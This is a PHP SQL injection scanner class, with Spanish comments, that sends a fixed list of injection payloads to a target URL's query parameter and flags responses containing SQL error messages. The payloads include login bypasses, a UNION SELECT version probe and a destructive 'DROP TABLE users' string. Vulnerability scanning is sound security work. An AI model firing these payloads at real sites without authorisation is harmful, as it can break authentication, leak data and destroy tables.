<?php
require_once '../utils/http_request.php';
require_once '../utils/logger.php';

class SQLInjectionScanner {
    private $url;

    public function __construct($url) {
        $this->url = $url;
    }

    public function scan() {
        Logger::log("Iniciando escaneo de SQL Injection en: $this->url");

        $patterns = [
            "' OR '1'='1", // Bypass básico
            "' OR 'a'='a", // Variación del bypass básico
            "'; DROP TABLE users;", // Intento de borrar tablas
            "' UNION SELECT null, version() --", // Obtener versión de la base de datos
            "' OR 1=1 --", // Comentario para bypass de autenticación
        ];

        $results = [];

        foreach ($patterns as $pattern) {
            $testUrl = $this->url . "?test=" . urlencode($pattern);
            $response = HttpRequest::get($testUrl);

            if ($this->isVulnerable($response)) {
                Logger::log("Vulnerabilidad de SQL Injection detectada con el patrón: $pattern");
                $results[] = [
                    'pattern' => $pattern,
                    'url' => $testUrl,
                    'status' => 'vulnerable'
                ];
            } else {
                Logger::log("Sin vulnerabilidad detectada para el patrón: $pattern");
                $results[] = [
                    'pattern' => $pattern,
                    'url' => $testUrl,
                    'status' => 'no vulnerable'
                ];
            }
        }

        return $results;
    }

    private function isVulnerable($response) {
        // Detecta vulnerabilidades comprobando patrones en la respuesta
        $vulnerabilityIndicators = [
            'syntax error',    // Mensaje de error de SQL
            'SQL syntax',      // Otro mensaje de error SQL
            'warning',         // Mensaje de advertencia de base de datos
            'unclosed quotation mark', // Error típico en cadenas
        ];

        foreach ($vulnerabilityIndicators as $indicator) {
            if (strpos($response, $indicator) !== false) {
                return true;
            }
        }
        return false;
    }
}
?>
